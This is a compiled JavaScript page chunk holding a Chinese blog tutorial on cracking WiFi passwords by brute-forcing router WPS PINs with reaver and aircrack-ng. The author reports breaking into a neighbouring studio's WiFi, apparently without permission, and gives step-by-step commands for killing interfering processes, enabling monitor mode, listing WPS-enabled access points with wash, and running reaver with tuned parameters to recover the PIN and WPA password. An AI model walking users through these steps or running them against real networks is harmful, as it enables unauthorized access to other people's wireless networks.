(window.webpackJsonp=window.webpackJsonp||[]).push([[171],{461:function(a,s,t){"use strict";t.r(s);var n=t(7),e=Object(n.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"使用reaver傻瓜式破解wifi之利用路由器wps漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#使用reaver傻瓜式破解wifi之利用路由器wps漏洞"}},[a._v("#")]),a._v(" 使用reaver傻瓜式破解wifi之利用路由器WPS漏洞")]),a._v(" "),s("p",[a._v("跟这篇破解教程一样，网上破解教程多是基于路由器的WPS漏洞破解，但是这样的路由器只占少数。一般wifi是依据WPA/WPA2加密的，因此想要破解一般的wifi，还得破解这个协议，虽然近期这个协议也被破解了，不过也是很不容易的。")]),a._v(" "),s("p",[a._v("刚入门破解，不是很熟悉，在网上找各种破解资料，终于破解成功了临近工作室的wifi，沾沾自喜~\n本文破解wifi针对一些路由器的WPS（Wi-fi protected setup）漏洞,尝试很多次抓包PIN码，破解2-3天，正常来说是一定能抓到正确的PIN码的。\n一个路由器对应唯一的MAC和PIN，而一旦得到MAC和PIN，通过reaver工具，路由密码等信息就可以很快得出来。")]),a._v(" "),s("p",[a._v("1.安装依赖包：")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("sudo")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("apt-get")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("install")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-y")]),a._v(" libpcap-dev\nlibsqlite3-dev sqlite3 libpcap0.8-dev libssl-dev build-essential iw tshark subversion\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("2.安装aircrack-ng：")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("cd")]),a._v(" aircrack-ng/\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("make")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("aircrack-ng源码安装参考http://www.tuicool.com/articles/MfUjii"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("sudo")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("make")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("install")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br")])]),s("p",[a._v("3.安装reaver:")]),a._v(" "),s("p",[a._v("在https://pan.baidu.com/s/1kUdvM1D下载reaver")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("tar")]),a._v(" zxvf reaver-1.4.tar.gz\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("cd")]),a._v(" reaver-1.4/src\n./configure\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("make")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("sudo")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("make")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("install")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br")])]),s("p",[a._v("4.如果安装成功后，会有airmon-ng,airodump-ng,reaver等命令可用(如果没有ethtool,要安装：apt-get install ethtool)")]),a._v(" "),s("p",[a._v("5.开始破解：(参考http://www.she.vc/article/18-108334-0.html http://www.kali.org.cn/thread-20995-1-1.html)\n（1）sudo airmon-ng check kill （关闭进程，部分进程可能影响到后续的操作）")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("Found "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("4")]),a._v(" processes that could cause trouble. \nIf airodump-ng, aireplay-ng or airtun-ng stops working after \na short period of time, you may want to run "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'airmon-ng check kill'")]),a._v(" \n \n\tPID Name \n\t"),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("431")]),a._v(" avahi-daemon \n\t"),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("446")]),a._v(" dhcpcd \n\t"),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("470")]),a._v(" avahi-daemon \n\t"),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("512")]),a._v(" wpa_supplicant\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br"),s("span",{staticClass:"line-number"},[a._v("8")]),s("br"),s("span",{staticClass:"line-number"},[a._v("9")]),s("br")])]),s("p",[a._v("（2）sudo airmon-ng")]),a._v(" "),s("p",[a._v("（3）sudo airmon-ng start wlan1")]),a._v(" "),s("p",[a._v("（4）sudo airmon-ng start wlan1mon （开启网卡，将网卡转换成混杂模式）")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("PHY Interface Driver Chipset \n \nphy0 wlan0 brcmfmac_sdio Broadcom "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("43430")]),a._v(" \n \nMissing nexutil, cannot switch to monitor mode. \nphy1 wlan1mon mt7601u Ralink Technology, Corp. \n \n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("mac80211 monitor mode already enabled "),s("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("for")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("phy1"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v("wlan1mon on "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("phy1"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("10")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br"),s("span",{staticClass:"line-number"},[a._v("8")]),s("br")])]),s("p",[a._v("（5）sudo airodump-ng wlan1mon （查看ap信号强度，破解的wifi信号越强越好）")]),a._v(" "),s("p",[a._v("（6）wash -i wlan1mon -C （查看支持wps的ap）（一种说法是：MB是54e.的可破解，54e不可破解）")]),a._v(" "),s("p",[a._v("6.（正式破解，在root下）使用reaver：")]),a._v(" "),s("p",[a._v("因状况调整参数：MAC即BSSID的值，-c后面的数字是CH的值。")]),a._v(" "),s("p",[a._v("目标信号非常好:")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("reaver "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-i")]),a._v(" wlan1mon "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-b")]),a._v(" MAC "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-a")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-S")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-vv")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-d0")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-c")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("1")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("目标信号普通:")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("reaver "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-i")]),a._v(" wlan1mon "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-b")]),a._v(" MAC "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-a")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-S")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-vv")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-d2")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-t")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("5")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-c")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("1")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("目标信号一般:")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("reaver "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-i")]),a._v(" wlan1mon "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-b")]),a._v(" MAC "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-a")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-S")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-vv")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-d5")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-c")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("1")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("7.每60s重新破解一次，等待三天，密码将会出来")]),a._v(" "),s("p",[a._v("8.最终得到PIN码（WPS PIN）和密码（WPA PSK），如果密码 被改，只要reaver加上-p命令\n(reaver -i wlan1mon -b MAC -p PIN码 -vv)，密码又能秒出； 但如果PIN码被改，就要重新破解了。")]),a._v(" "),s("p",[a._v("9.破解完成后，将网卡转回正常状态（airmon-ng stop wlan1mon）")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20181201230356708.png",loading:"lazy"}})]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20181201230518468.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("备注：reaver时可以随时停止，它自己会保存进度")]),a._v(" "),s("p",[a._v("升级破解固件"),s("a",{attrs:{href:"http://netsecurity.51cto.com/art/201105/264844_all.htm",target:"_blank",rel:"noopener noreferrer"}},[a._v("http://netsecurity.51cto.com/art/201105/264844_all.htm"),s("OutboundLink")],1)]),a._v(" "),s("h2",{attrs:{id:"写在最后"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[a._v("#")]),a._v(" 写在最后")]),a._v(" "),s("blockquote",[s("p",[a._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);s.default=e.exports}}]);